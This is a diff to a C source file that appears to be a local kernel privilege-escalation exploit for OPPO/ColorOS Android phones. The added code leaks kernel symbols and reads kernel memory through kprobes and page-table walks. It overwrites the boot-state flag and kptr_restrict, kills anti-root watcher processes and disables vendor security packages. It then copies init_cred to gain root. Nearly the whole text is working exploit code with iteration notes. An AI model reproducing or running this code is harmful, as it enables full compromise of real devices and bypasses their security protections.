@@ -870,6 +870,512 @@ static void uid0_park_diag(void) {
     close(fd);
 }
 
+static int perf_open_hw(int pid, struct perf_event_attr *pe, const char **mode);
+
+/* After park, dump oplus rootguard/kevent symbols. No extra pselect walk. */
+static void uid0_harvest_rootguard(void) {
+  static const char *outs[] = {"/data/local/tmp/rootguard_syms.txt",
+                               "/sdcard/ghostlock/aarif/rootguard_syms.txt"};
+  char line[320];
+  int nmatch = 0, nline = 0, hashed = 0;
+  FILE *ks = fopen("/proc/kallsyms", "r");
+  FILE *mod = fopen("/proc/modules", "r");
+  int ofd[2];
+  size_t i;
+
+  for (i = 0; i < 2; i++)
+    ofd[i] = open(outs[i], O_WRONLY | O_CREAT | O_TRUNC | O_SYNC, 0644);
+
+  pr_info("UID0 harvest rootguard kallsyms\n");
+  live_sync_log("UID0", "harvest_rootguard");
+  if (!ks) {
+    pr_info("UID0 kallsyms fopen errno=%d\n", errno);
+    for (i = 0; i < 2; i++)
+      if (ofd[i] >= 0)
+        close(ofd[i]);
+    if (mod)
+      fclose(mod);
+    return;
+  }
+  while (fgets(line, sizeof(line), ks) && nmatch < 120) {
+    nline++;
+    if (nline <= 3 && line[0] == '0')
+      hashed++;
+    if (!strstr(line, "is_unlocked") && !strstr(line, "g_boot_state") &&
+        !strstr(line, "verified_bootstate") && !strstr(line, "oplus_root") &&
+        !strstr(line, "kevent_send") && !strstr(line, "oplus_kevent") &&
+        !strstr(line, "secure_guard") && !strstr(line, "oplus_security") &&
+        !strstr(line, "oplus_hook") && !strstr(line, "root_check") &&
+        !strstr(line, "oplus_root_killed") && !strstr(line, "KEVENT_ROOT") &&
+        !strstr(line, "oplus_guard") && !strstr(line, "android_kabi"))
+      continue;
+    nmatch++;
+    pr_info("UID0 SYM %s", line);
+    for (i = 0; i < 2; i++)
+      if (ofd[i] >= 0)
+        (void)write(ofd[i], line, strlen(line));
+  }
+  fclose(ks);
+  {
+    char hdr[80];
+    int n = snprintf(hdr, sizeof(hdr),
+                     "# nline=%d nmatch=%d hashed_head=%d\n", nline, nmatch,
+                     hashed);
+    if (n > 0)
+      for (i = 0; i < 2; i++)
+        if (ofd[i] >= 0)
+          (void)write(ofd[i], hdr, (size_t)n);
+  }
+  if (mod) {
+    const char *mh = "# /proc/modules\n";
+    for (i = 0; i < 2; i++)
+      if (ofd[i] >= 0)
+        (void)write(ofd[i], mh, strlen(mh));
+    while (fgets(line, sizeof(line), mod)) {
+      if (!strstr(line, "oplus") && !strstr(line, "kevent") &&
+          !strstr(line, "secure"))
+        continue;
+      pr_info("UID0 MOD %s", line);
+      for (i = 0; i < 2; i++)
+        if (ofd[i] >= 0)
+          (void)write(ofd[i], line, strlen(line));
+    }
+    fclose(mod);
+  }
+  for (i = 0; i < 2; i++)
+    if (ofd[i] >= 0)
+      close(ofd[i]);
+  pr_info("UID0 harvest done nmatch=%d nline=%d\n", nmatch, nline);
+}
+
+/*
+ * oplus_security_guard.ko (Z43 ELF, 5.10 STRICT_MODULE_RWX core layout):
+ *   .text @0 (0xfe0), RO through ~0x23a8 → page 0x3000,
+ *   .data..ro_after_init @0x3000 (g_boot_state, 1 byte, rest of page pad).
+ * is_unlocked is LDRB + RET — any nonzero byte is ORANGE.
+ * Hook text: pre 0x3ac, post 0x3e8, is_unlocked 0x4b4.
+ * Z44: kptr VALUE 0xffffff8100000000 is live DRAM, not a zero rb_node → KP.
+ */
+#define GBOOT_CORE_OFF 0x3000ULL
+#define HOOK_TEXT_LO 0x3acU
+#define HOOK_TEXT_HI 0x4c8U
+/* Live PCs are KASLR'd in 0xffffffe4… (Z45). File kallsyms 0xffffffc0 is not
+ * the runtime instruction VA. Module .text is an outlier page in that window
+ * with IPs at post 0x3e8 / pre 0x3ac (Z45: ffffffe466c173e8). */
+
+static uintptr_t uid0_harvest_modip(void) {
+  const char *mode = "none";
+  struct perf_event_attr pe;
+  int fd;
+  uintptr_t gboot = 0, text_base = 0;
+  int n_samp = 0, n_mod = 0, n_hook = 0;
+  char line[160];
+
+  pr_info("UID0 harvest modip (perf IP + sysfs sections)\n");
+  live_sync_log("UID0", "harvest_modip");
+
+  {
+    static const char *secs[] = {
+        "/sys/module/oplus_security_guard/sections/.data..ro_after_init",
+        "/sys/module/oplus_security_guard/sections/.text",
+        "/sys/module/oplus_security_guard/sections/.bss",
+    };
+    size_t si;
+    for (si = 0; si < sizeof(secs) / sizeof(secs[0]); si++) {
+      memset(line, 0, sizeof(line));
+      errno = 0;
+      read_first_line(secs[si], line, sizeof(line));
+      pr_info("UID0 sysfs %s errno=%d [%.80s]\n", secs[si], errno, line);
+      if (!gboot && line[0]) {
+        uintptr_t v = (uintptr_t)strtoull(line, NULL, 0);
+        if (v > 0xffffffc000000000ULL && v < 0xffffffc008000000ULL) {
+          if (strstr(secs[si], "ro_after_init"))
+            gboot = v;
+          else if (strstr(secs[si], ".text") && !text_base)
+            text_base = v & ~0xfffULL;
+        }
+      }
+    }
+  }
+  {
+    FILE *cf = popen("toybox zcat /proc/config.gz 2>/dev/null", "r");
+    if (cf) {
+      int ncfg = 0;
+      while (fgets(line, sizeof(line), cf) && ncfg < 12) {
+        if (!strstr(line, "MODULE") && !strstr(line, "KASLR") &&
+            !strstr(line, "STRICT") && !strstr(line, "IKCONFIG"))
+          continue;
+        if (strstr(line, "STRICT_MODULE") || strstr(line, "MODULE_RWX") ||
+            strstr(line, "RANDOMIZE_MODULE") || strstr(line, "MODULE_UNLOAD") ||
+            strstr(line, "IKCONFIG") || strstr(line, "KPROBE") ||
+            strstr(line, "FTRACE") || strstr(line, "PTDUMP")) {
+          ncfg++;
+          pr_info("UID0 CFG %.80s", line);
+        }
+      }
+      pclose(cf);
+    }
+  }
+
+  fd = perf_open_hw(0, &pe, &mode);
+  if (fd < 0) {
+    pr_info("UID0 modip perf open fail mode=%s\n", mode);
+    if (!gboot && text_base)
+      gboot = text_base + GBOOT_CORE_OFF;
+    pr_info("UID0 GBOOT guess=%016zx text=%016zx\n", gboot, text_base);
+    return gboot;
+  }
+  {
+    size_t msz = 4096 * (1 + 32);
+    void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
+    uintptr_t pages[24];
+    int pc[24];
+    int hc[24];
+    int np = 0;
+    memset(pc, 0, sizeof(pc));
+    memset(hc, 0, sizeof(hc));
+    if (buf == MAP_FAILED) {
+      pr_info("UID0 modip mmap errno=%d\n", errno);
+      close(fd);
+      if (!gboot && text_base)
+        gboot = text_base + GBOOT_CORE_OFF;
+      return gboot;
+    }
+    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
+    {
+      int i;
+      for (i = 0; i < 3000000; i++)
+        syscall(__NR_getpid);
+    }
+    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
+    {
+      struct perf_event_mmap_page *hdr = buf;
+      uint64_t head = hdr->data_head;
+      char *base = (char *)buf + 4096;
+      size_t dsz = 4096 * 32;
+      uint64_t pos = hdr->data_tail;
+      __sync_synchronize();
+      while (pos < head) {
+        struct perf_event_header *ev = (void *)(base + (pos % dsz));
+        uint64_t ip;
+        unsigned off;
+        int i, found;
+        if (ev->size == 0)
+          break;
+        if (ev->type != PERF_RECORD_SAMPLE) {
+          pos += ev->size;
+          continue;
+        }
+        ip = *(uint64_t *)((char *)ev + sizeof(*ev));
+        n_samp++;
+        if (n_samp <= 6)
+          pr_info("UID0 RAWIP %016llx\n", (unsigned long long)ip);
+        /* File kallsyms 0xffffffc0 is not the runtime PC. Z45=0xffffffe4,
+         * Z46=0xffffffd5 — accept any kernel canonical IP. */
+        if (ip < 0xffff000000000000ULL) {
+          pos += ev->size;
+          continue;
+        }
+        n_mod++;
+        off = (unsigned)(ip & 0xfffU);
+        found = -1;
+        for (i = 0; i < np; i++)
+          if (pages[i] == (ip & ~0xfffULL)) {
+            found = i;
+            break;
+          }
+        if (found >= 0)
+          pc[found]++;
+        else if (np < 24) {
+          pages[np] = ip & ~0xfffULL;
+          pc[np] = 1;
+          hc[np] = 0;
+          found = np;
+          np++;
+        }
+        if (found >= 0 && off >= HOOK_TEXT_LO && off < HOOK_TEXT_HI) {
+          hc[found]++;
+          n_hook++;
+          if (n_hook <= 12)
+            pr_info("UID0 HOOKIP %016llx off=%03x\n",
+                    (unsigned long long)ip, off);
+        }
+        pos += ev->size;
+      }
+      hdr->data_tail = head;
+      {
+        int pi, best = -1, bh = 0, hot = 0;
+        for (pi = 0; pi < np; pi++) {
+          pr_info("UID0 MODPAGE %016zx n=%d hook=%d\n", pages[pi], pc[pi],
+                  hc[pi]);
+          if (pc[pi] > pc[hot])
+            hot = pi;
+        }
+        for (pi = 0; pi < np; pi++) {
+          if (pi == hot)
+            continue;
+          if (hc[pi] > bh) {
+            bh = hc[pi];
+            best = pi;
+          }
+        }
+        if (best >= 0 && bh >= 2)
+          text_base = pages[best];
+      }
+    }
+    munmap(buf, msz);
+    close(fd);
+  }
+  pr_info("UID0 modip mode=%s samp=%d mod=%d hook=%d text=%016zx\n", mode,
+          n_samp, n_mod, n_hook, text_base);
+  if (!gboot && text_base && n_hook >= 2)
+    gboot = text_base + GBOOT_CORE_OFF;
+  pr_info("UID0 GBOOT va=%016zx (core+0x3000, n_hook=%d)\n", gboot, n_hook);
+  return gboot;
+}
+
+/* Translate module VA → physmap P0. Z47 wrote the RO vmalloc PTE and KPd.
+ * 5.10 perf_virt_to_phys() returns 0 for VMALLOC — try a kernel read-watch
+ * on the LDRB anyway (paranoid=-1 after park). RAM phys → P0. */
+#ifndef PERF_TYPE_BREAKPOINT
+#define PERF_TYPE_BREAKPOINT 5
+#endif
+#ifndef HW_BREAKPOINT_R
+#define HW_BREAKPOINT_R 1
+#endif
+#ifndef HW_BREAKPOINT_LEN_1
+#define HW_BREAKPOINT_LEN_1 1
+#endif
+
+static int uid0_write_str(const char *path, const char *s) {
+  int fd = open(path, O_WRONLY | O_CLOEXEC);
+  ssize_t n;
+  if (fd < 0)
+    return -errno;
+  n = write(fd, s, strlen(s));
+  close(fd);
+  return n < 0 ? -errno : 0;
+}
+
+static int uid0_kprobe_read64(uintptr_t kaddr, uint64_t *out) {
+  static const char *const roots[] = {"/sys/kernel/tracing",
+                                      "/sys/kernel/debug/tracing"};
+  static const char *const probes[] = {"__traceiter_sys_exit", "el0_svc",
+                                       "do_el0_svc"};
+  char ke[80], en[96], tr[80], line[256], cmd[192];
+  int ri, pi, fd, ntry;
+  *out = 0;
+  for (ri = 0; ri < 2; ri++) {
+    snprintf(ke, sizeof(ke), "%s/kprobe_events", roots[ri]);
+    if (access(ke, W_OK) != 0) {
+      pr_info("UID0 kprobe %s W_OK errno=%d\n", ke, errno);
+      continue;
+    }
+    snprintf(en, sizeof(en), "%s/events/kprobes/glrd/enable", roots[ri]);
+    snprintf(tr, sizeof(tr), "%s/trace", roots[ri]);
+    for (pi = 0; pi < 3; pi++) {
+      uid0_write_str(ke, "-:glrd\n");
+      snprintf(cmd, sizeof(cmd), "p:glrd %s v=@0x%zx\n", probes[pi], kaddr);
+      if (uid0_write_str(ke, cmd) != 0) {
+        pr_info("UID0 kprobe add '%s' errno=%d\n", cmd, errno);
+        continue;
+      }
+      uid0_write_str(tr, "\n");
+      if (uid0_write_str(en, "1\n") != 0) {
+        pr_info("UID0 kprobe enable errno=%d\n", errno);
+        uid0_write_str(ke, "-:glrd\n");
+        continue;
+      }
+      for (ntry = 0; ntry < 200000; ntry++)
+        syscall(__NR_getpid);
+      uid0_write_str(en, "0\n");
+      fd = open(tr, O_RDONLY | O_CLOEXEC);
+      if (fd >= 0) {
+        char buf[4096];
+        ssize_t n = read(fd, buf, sizeof(buf) - 1);
+        close(fd);
+        if (n > 0) {
+          char *hit;
+          buf[n] = 0;
+          hit = strstr(buf, "v=0x");
+          if (!hit)
+            hit = strstr(buf, "v=");
+          if (hit) {
+            *out = strtoull(hit + 2, NULL, 0);
+            pr_info("UID0 kpread %016zx -> %016llx via %s\n", kaddr,
+                    (unsigned long long)*out, probes[pi]);
+            uid0_write_str(ke, "-:glrd\n");
+            return 0;
+          }
+          buf[sizeof(line) - 1] = 0;
+          snprintf(line, sizeof(line), "%.80s", buf);
+          pr_info("UID0 kprobe trace no v= [%.80s]\n", line);
+        }
+      }
+      uid0_write_str(ke, "-:glrd\n");
+    }
+  }
+  return -1;
+}
+
+#define PTE_VALID 1ULL
+#define PTE_TABLE 2ULL
+#define PTE_ADDR_MASK 0x0000fffffffff000ULL
+#define PGDIR_SHIFT 30
+#define PMD_SHIFT 21
+
+static uintptr_t uid0_pgt_next_p0(uint64_t desc) {
+  uint64_t phys = desc & PTE_ADDR_MASK;
+  if (phys < 0x80000000ULL || phys >= 0x380000000ULL)
+    return 0;
+  return (uintptr_t)(DIRECT_MAP_BASE + (phys - P0_PHYS_OFFSET));
+}
+
+static uintptr_t uid0_walk_mod_p0(uintptr_t va) {
+  uint64_t pgd_off = 0x2491000ULL; /* swapper_pg_dir - _text, kallsyms */
+  uintptr_t pgd_p0 = data_addr(KIMAGE_TEXT_BASE + pgd_off);
+  unsigned pgd_i = (unsigned)((va >> PGDIR_SHIFT) & 0x1ffU);
+  unsigned pmd_i = (unsigned)((va >> PMD_SHIFT) & 0x1ffU);
+  unsigned pte_i = (unsigned)((va >> PAGE_SHIFT) & 0x1ffU);
+  uint64_t pgd = 0, pmd = 0, pte = 0;
+  uintptr_t p0;
+
+  pr_info("UID0 ptwalk va=%016zx pgd_p0=%016zx idx=%u/%u/%u\n", va, pgd_p0,
+          pgd_i, pmd_i, pte_i);
+  if (uid0_kprobe_read64(pgd_p0 + (uintptr_t)pgd_i * 8, &pgd) || !pgd) {
+    pr_info("UID0 ptwalk pgd read fail pgd=%016llx\n", (unsigned long long)pgd);
+    return 0;
+  }
+  pr_info("UID0 ptwalk pgd=%016llx\n", (unsigned long long)pgd);
+  if (!(pgd & PTE_VALID))
+    return 0;
+  if (!(pgd & PTE_TABLE)) {
+    /* 1GB block */
+    uint64_t phys = (pgd & PTE_ADDR_MASK) | (va & 0x3fffffffULL);
+    p0 = (uintptr_t)(DIRECT_MAP_BASE + (phys - P0_PHYS_OFFSET));
+    pr_info("UID0 ptwalk 1G block p0=%016zx\n", p0);
+    return p0;
+  }
+  p0 = uid0_pgt_next_p0(pgd);
+  if (!p0 || uid0_kprobe_read64(p0 + (uintptr_t)pmd_i * 8, &pmd) || !pmd) {
+    pr_info("UID0 ptwalk pmd read fail pmd=%016llx\n", (unsigned long long)pmd);
+    return 0;
+  }
+  pr_info("UID0 ptwalk pmd=%016llx\n", (unsigned long long)pmd);
+  if (!(pmd & PTE_VALID))
+    return 0;
+  if (!(pmd & PTE_TABLE)) {
+    uint64_t phys = (pmd & PTE_ADDR_MASK) | (va & 0x1fffffULL);
+    p0 = (uintptr_t)(DIRECT_MAP_BASE + (phys - P0_PHYS_OFFSET));
+    pr_info("UID0 ptwalk 2M block p0=%016zx\n", p0);
+    return p0;
+  }
+  p0 = uid0_pgt_next_p0(pmd);
+  if (!p0 || uid0_kprobe_read64(p0 + (uintptr_t)pte_i * 8, &pte) || !pte) {
+    pr_info("UID0 ptwalk pte read fail pte=%016llx\n", (unsigned long long)pte);
+    return 0;
+  }
+  pr_info("UID0 ptwalk pte=%016llx\n", (unsigned long long)pte);
+  if (!(pte & PTE_VALID))
+    return 0;
+  {
+    uint64_t phys = (pte & PTE_ADDR_MASK) | (va & 0xfffULL);
+    if (phys < 0x80000000ULL || phys >= 0x380000000ULL) {
+      pr_info("UID0 ptwalk phys out of RAM %016llx\n",
+              (unsigned long long)phys);
+      return 0;
+    }
+    p0 = (uintptr_t)(DIRECT_MAP_BASE + (phys - P0_PHYS_OFFSET));
+    pr_info("UID0 ptwalk page p0=%016zx phys=%016llx\n", p0,
+            (unsigned long long)phys);
+    return p0;
+  }
+}
+
+static uintptr_t uid0_gboot_to_p0(uintptr_t va) {
+  struct perf_event_attr pe;
+  int fd, i, ns = 0;
+  uintptr_t p0 = 0;
+  uint64_t phys_seen = 0;
+
+  if (!va)
+    return 0;
+  p0 = uid0_walk_mod_p0(va);
+  if (p0)
+    return p0;
+  memset(&pe, 0, sizeof(pe));
+  pe.size = sizeof(pe);
+  pe.type = PERF_TYPE_BREAKPOINT;
+  pe.sample_period = 1;
+  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_ADDR | PERF_SAMPLE_PHYS_ADDR;
+  pe.disabled = 1;
+  pe.exclude_user = 1;
+  pe.exclude_hv = 1;
+  pe.bp_addr = va;
+  pe.bp_len = HW_BREAKPOINT_LEN_1;
+  pe.bp_type = HW_BREAKPOINT_R;
+  errno = 0;
+  fd = (int)syscall(__NR_perf_event_open, &pe, 0L, -1, -1, 0);
+  pr_info("UID0 gboot_bp fd=%d errno=%d va=%016zx\n", fd, errno, va);
+  if (fd < 0)
+    return 0;
+  {
+    size_t msz = 4096 * 9;
+    void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
+    if (buf == MAP_FAILED) {
+      pr_info("UID0 gboot_bp mmap errno=%d\n", errno);
+      close(fd);
+      return 0;
+    }
+    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
+    for (i = 0; i < 2000000; i++)
+      syscall(__NR_getpid);
+    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
+    {
+      struct perf_event_mmap_page *hdr = buf;
+      uint64_t head = hdr->data_head;
+      char *base = (char *)buf + 4096;
+      size_t dsz = 4096 * 8;
+      uint64_t pos = hdr->data_tail;
+      __sync_synchronize();
+      while (pos < head && ns < 32) {
+        struct perf_event_header *ev = (void *)(base + (pos % dsz));
+        char *p;
+        uint64_t ip, addr, phys;
+        if (ev->size == 0)
+          break;
+        if (ev->type != PERF_RECORD_SAMPLE) {
+          pos += ev->size;
+          continue;
+        }
+        p = (char *)ev + sizeof(*ev);
+        ip = *(uint64_t *)p;
+        p += 8;
+        addr = *(uint64_t *)p;
+        p += 8;
+        phys = *(uint64_t *)p;
+        ns++;
+        if (ns <= 8)
+          pr_info("UID0 gboot_bp ip=%016llx addr=%016llx phys=%016llx\n",
+                  (unsigned long long)ip, (unsigned long long)addr,
+                  (unsigned long long)phys);
+        if (phys >= 0x80000000ULL && phys < 0x380000000ULL)
+          phys_seen = phys;
+        pos += ev->size;
+      }
+    }
+    munmap(buf, msz);
+  }
+  close(fd);
+  if (phys_seen) {
+    p0 = (uintptr_t)(DIRECT_MAP_BASE + (phys_seen - P0_PHYS_OFFSET));
+    pr_info("UID0 gboot_p0 %016zx phys=%016llx (from bp, n=%d)\n", p0,
+            (unsigned long long)phys_seen, ns);
+  } else
+    pr_info("UID0 gboot_p0 none (nsamp=%d) — not punching RO module VA\n", ns);
+  return p0;
+}
+
 /*
  * Z18: parent and child majority-voted the same P0 VA — a hot shared
  * kernel object, not task_struct (that VA was only 16-byte aligned).
@@ -1264,6 +1770,108 @@ static void uid0_w2_overlay(void) {
   pselect_child_node = 1;
 }
 
+static uint32_t status_uid_of(const char *proc_status) {
+  FILE *sf = fopen(proc_status, "r");
+  if (!sf)
+    return 9999;
+  char line[192];
+  uint32_t u = 9999;
+  while (fgets(line, sizeof(line), sf)) {
+    unsigned v = 9999;
+    if (sscanf(line, "Uid: %u", &v) == 1) {
+      u = v;
+      break;
+    }
+  }
+  fclose(sf);
+  return u;
+}
+
+static void uid0_write_proof(uint32_t self_uid, uint32_t self_status,
+                             uint32_t child_uid, uint32_t child_status,
+                             const char *who, uintptr_t task) {
+  char b[320];
+  int n = snprintf(b, sizeof(b),
+                   "self_getuid=%u self_geteuid=%u self_status=%u "
+                   "child_getuid=%u child_status=%u who=%s task=%016zx\n",
+                   self_uid, (uint32_t)geteuid(), self_status, child_uid,
+                   child_status, who, task);
+  const char *paths[] = {"/data/local/tmp/ghostlock_uid0",
+                         "/sdcard/ghostlock/aarif/uid0_proof.txt"};
+  for (size_t i = 0; i < sizeof(paths) / sizeof(paths[0]); i++) {
+    int pf = open(paths[i], O_WRONLY | O_CREAT | O_TRUNC | O_SYNC, 0644);
+    if (pf >= 0) {
+      if (n > 0)
+        (void)write(pf, b, (size_t)n);
+      close(pf);
+    }
+  }
+  pr_info("UID0 proof %s", b);
+  fflush(stdout);
+  fsync(STDOUT_FILENO);
+}
+
+static int uid0_scan_watchers(pid_t *out, int max) {
+  DIR *d = opendir("/proc");
+  int n = 0;
+  struct dirent *e;
+  if (!d)
+    return 0;
+  while ((e = readdir(d)) != NULL && n < max) {
+    char *end = NULL;
+    long pid = strtol(e->d_name, &end, 10);
+    char path[64], comm[40];
+    int fd;
+    ssize_t r;
+    int i;
+    if (!end || *end || pid <= 2)
+      continue;
+    /* Kernel threads (ppid 2) — SIGKILL hangs (Z41). */
+    {
+      char st[256];
+      int sfd;
+      unsigned long ppid = 0;
+      snprintf(path, sizeof(path), "/proc/%ld/stat", pid);
+      sfd = open(path, O_RDONLY);
+      if (sfd < 0)
+        continue;
+      r = read(sfd, st, sizeof(st) - 1);
+      close(sfd);
+      if (r <= 0)
+        continue;
+      st[r] = 0;
+      if (sscanf(st, "%*d (%*[^)]) %*c %lu", &ppid) != 1 || ppid == 2)
+        continue;
+    }
+    snprintf(path, sizeof(path), "/proc/%ld/comm", pid);
+    fd = open(path, O_RDONLY);
+    if (fd < 0)
+      continue;
+    r = read(fd, comm, sizeof(comm) - 1);
+    close(fd);
+    if (r <= 0)
+      continue;
+    comm[r] = 0;
+    for (i = 0; i < (int)r; i++)
+      if (comm[i] == '\n')
+        comm[i] = 0;
+    if (strstr(comm, "kevent") || strstr(comm, "exsystem") ||
+        strstr(comm, "anti_root"))
+      out[n++] = (pid_t)pid;
+  }
+  closedir(d);
+  return n;
+}
+
+static void uid0_kill_watchers(const pid_t *p, int n) {
+  int i;
+  for (i = 0; i < n; i++) {
+    errno = 0;
+    int r = kill(p[i], SIGKILL);
+    pr_info("UID0 kill watcher pid=%d ret=%d errno=%d\n", (int)p[i], r, errno);
+  }
+}
+
 static void uid0_one_store(uintptr_t slot, const char *tag) {
   uid0_w2_overlay();
   uintptr_t icred = data_addr(g_init_cred_image);
@@ -1276,12 +1884,195 @@ static void uid0_one_store(uintptr_t slot, const char *tag) {
   fflush(stdout);
 }
 
+static void uid0_run_cmd(char *const argv[]) {
+  pid_t p = fork();
+  if (p == 0) {
+    int dn = open("/dev/null", O_WRONLY);
+    if (dn >= 0) {
+      dup2(dn, 1);
+      dup2(dn, 2);
+      close(dn);
+    }
+    execv(argv[0], argv);
+    _exit(127);
+  }
+  if (p > 0) {
+    int st = 0;
+    waitpid(p, &st, 0);
+  }
+}
+
+/* Park is Permissive: disable the ColorOS watchers that 15s-reboot on
+ * self cred (Z34). stdsp-only was not enough (safecenter/subsys still ran). */
+static void uid0_mute_coloros(void) {
+  static const char *pkgs[] = {
+      "com.oplus.exsystemservice",
+      "com.oplus.stdsp",
+      "com.oplus.safecenter",
+      "com.oplus.subsys",
+      "com.oplus.securityguard",
+      "com.coloros.phonemanager",
+  };
+  pr_info("UID0 mute ColorOS watchers\n");
+  live_sync_log("UID0", "mute_coloros");
+  durable_stage("uid0_mute_coloros");
+  for (size_t i = 0; i < sizeof(pkgs) / sizeof(pkgs[0]); i++) {
+    char *dis[] = {"/system/bin/pm", "disable-user", "--user", "0",
+                   (char *)pkgs[i], NULL};
+    char *stp[] = {"/system/bin/am", "force-stop", (char *)pkgs[i], NULL};
+    uid0_run_cmd(dis);
+    uid0_run_cmd(stp);
+  }
+  usleep(400000);
+}
+
 /* Same-process W2 after a live Z4 park. Z5 (second GhostLock process) KP'd. */
 static int uid0_cred_walk(void) {
   pr_success("UID0: park live — diag then cred if P0 task leak\n");
   durable_stage("uid0_park_ok");
   live_sync_log("UID0", "park_ok");
   uid0_park_diag();
+  uid0_harvest_rootguard();
+  {
+    uintptr_t gboot = uid0_harvest_modip();
+    /* Walk 2 = g_boot_state nonzero. is_unlocked is LDRB+RET (any nz = orange).
+     * VALUE = BSS P0|1 (proven zero rb_node, low byte 1). Do not reuse Z44
+     * 0xffffff8100000000 (live DRAM). Module VA may be RO-after-init — if this
+     * KPs, next is physmap alias. */
+    if (env_flag("MODE4_UID0_GBOOT", 0)) {
+      const char *ev = getenv("GBOOT_VA");
+      if (ev && ev[0])
+        gboot = (uintptr_t)strtoull(ev, NULL, 0);
+      if (!gboot) {
+        pr_info("UID0 GBOOT no VA — HOLD, no punch\n");
+        live_sync_log("UID0", "gboot_no_va");
+        durable_stage("uid0_gboot_hold");
+        for (;;) {
+          char eb[4] = {0};
+          int efd = open("/sys/fs/selinux/enforce", O_RDONLY);
+          if (efd >= 0) {
+            (void)read(efd, eb, 3);
+            close(efd);
+          }
+          pr_info("UID0 GBOOT HOLD noVA getuid=%u enforce=%.2s\n",
+                  (unsigned)getuid(), eb);
+          fflush(stdout);
+          fsync(STDOUT_FILENO);
+          sleep(15);
+        }
+      }
+      {
+        uintptr_t p0 = uid0_gboot_to_p0(gboot);
+        pr_info("UID0 GBOOT va=%016zx p0=%016zx\n", gboot, p0);
+        if (!p0) {
+          pr_info("UID0 GBOOT no P0 — HOLD, not punching RO module VA\n");
+          live_sync_log("UID0", "gboot_no_p0");
+          durable_stage("uid0_gboot_hold");
+          for (;;) {
+            char eb[4] = {0};
+            int efd = open("/sys/fs/selinux/enforce", O_RDONLY);
+            if (efd >= 0) {
+              (void)read(efd, eb, 3);
+              close(efd);
+            }
+            pr_info("UID0 GBOOT HOLD noP0 va=%016zx getuid=%u enforce=%.2s\n",
+                    gboot, (unsigned)getuid(), eb);
+            fflush(stdout);
+            fsync(STDOUT_FILENO);
+            sleep(15);
+          }
+        }
+        gboot = p0;
+      }
+      pr_info("UID0 GBOOT punch slot=%016zx val=BSS|1 (physmap)\n", gboot);
+      live_sync_log("UID0", "gboot_punch");
+      durable_stage("uid0_gboot_enter");
+      unsetenv("MODE4_SLIDE_ZERO");
+      unsetenv("MODE4_SLIDE_CRED");
+      unsetenv("MODE4_SLIDE_KPTR");
+      setenv("MODE4_SLIDE_GBOOT", "1", 1);
+      uid0_w2_overlay();
+      set_pselect_write_mode(gboot, 0, 4);
+      run_main_route_threads();
+      clear_pselect_write();
+      pr_success("UID0 GBOOT done — HOLD, no cred\n");
+      durable_stage("uid0_gboot_hold");
+      for (;;) {
+        char eb[4] = {0};
+        int efd = open("/sys/fs/selinux/enforce", O_RDONLY);
+        if (efd >= 0) {
+          (void)read(efd, eb, 3);
+          close(efd);
+        }
+        pr_info("UID0 GBOOT HOLD getuid=%u enforce=%.2s\n", (unsigned)getuid(),
+                eb);
+        fflush(stdout);
+        fsync(STDOUT_FILENO);
+        sleep(15);
+      }
+    }
+  }
+  /* Walk 2 = kptr_restrict=0 (vmlinux, known P0). Unhashes kallsyms so
+   * g_boot_state VA is readable. Not a uid drop → hook does not SIGKILL.
+   * Z44: VALUE 0xffffff8100000000 KPd — do not reuse. */
+  if (env_flag("MODE4_UID0_KPTR", 0)) {
+    uint64_t koff = (active_offsets && active_offsets->off_kptr_restrict)
+                        ? active_offsets->off_kptr_restrict
+                        : 0x027BCF68ULL;
+    uintptr_t slot = data_addr(KIMAGE_TEXT_BASE + koff);
+    pr_info("UID0 KPTR punch slot=%016zx\n", slot);
+    live_sync_log("UID0", "kptr_punch");
+    durable_stage("uid0_kptr_enter");
+    unsetenv("MODE4_SLIDE_ZERO");
+    unsetenv("MODE4_SLIDE_CRED");
+    setenv("MODE4_SLIDE_KPTR", "1", 1);
+    uid0_w2_overlay();
+    set_pselect_write_mode(slot, 0, 4);
+    run_main_route_threads();
+    clear_pselect_write();
+    {
+      char kr[16] = {0};
+      read_first_line("/proc/sys/kernel/kptr_restrict", kr, sizeof(kr));
+      pr_info("UID0 kptr_restrict_after=%s\n", kr);
+    }
+    uid0_harvest_rootguard();
+    pr_success("UID0 KPTR done — HOLD, no cred\n");
+    durable_stage("uid0_kptr_hold");
+    for (;;) {
+      char eb[4] = {0};
+      int efd = open("/sys/fs/selinux/enforce", O_RDONLY);
+      if (efd >= 0) {
+        (void)read(efd, eb, 3);
+        close(efd);
+      }
+      pr_info("UID0 KPTR HOLD getuid=%u enforce=%.2s\n", (unsigned)getuid(),
+              eb);
+      fflush(stdout);
+      fsync(STDOUT_FILENO);
+      sleep(15);
+    }
+  }
+  /* HOLDPARK: keep the same process (Z5) and do not spend W2 on cred.
+   * oplus_root_check_post_handler SIGKILLs self-cred on pselect return. */
+  if (env_flag("MODE4_UID0_HOLDPARK", 0)) {
+    pr_success("UID0 HOLDPARK — symbols dumped, no cred punch\n");
+    live_sync_log("UID0", "holdpark");
+    durable_stage("uid0_holdpark");
+    for (;;) {
+      char eb[4] = {0};
+      int efd = open("/sys/fs/selinux/enforce", O_RDONLY);
+      if (efd >= 0) {
+        (void)read(efd, eb, 3);
+        close(efd);
+      }
+      pr_info("UID0 HOLDPARK getuid=%u enforce=%.2s\n", (unsigned)getuid(),
+              eb);
+      fflush(stdout);
+      fsync(STDOUT_FILENO);
+      sleep(15);
+    }
+  }
+  uid0_mute_coloros();
 
   unsetenv("MODE4_SLIDE_ZERO");
   setenv("MODE4_SLIDE_CRED", "1", 1);
@@ -1310,30 +2101,17 @@ static int uid0_cred_walk(void) {
   int ucnt = 0;
   uintptr_t use_task = 0;
   const char *who = "none";
-  /* Z27: parent x28 landed in P0 DRAM (ffffff80…). Prefer that so getuid()
-   * is in-process. Child high-alias cred store lived but getuid never
-   * replied. Z26 comm canary showed x28+0x790 is task.comm. */
-  /* Z28: DRAM-modulo wrap of ffffff89→ffffff81 pre-select KP. Raw high
-   * alias stores live (Z25–Z27). Only use P0 if the sample is already
-   * in the 16GB window. */
-  if (p0_dram_ptr(lself.x28) && lself.x28_cnt >= 8) {
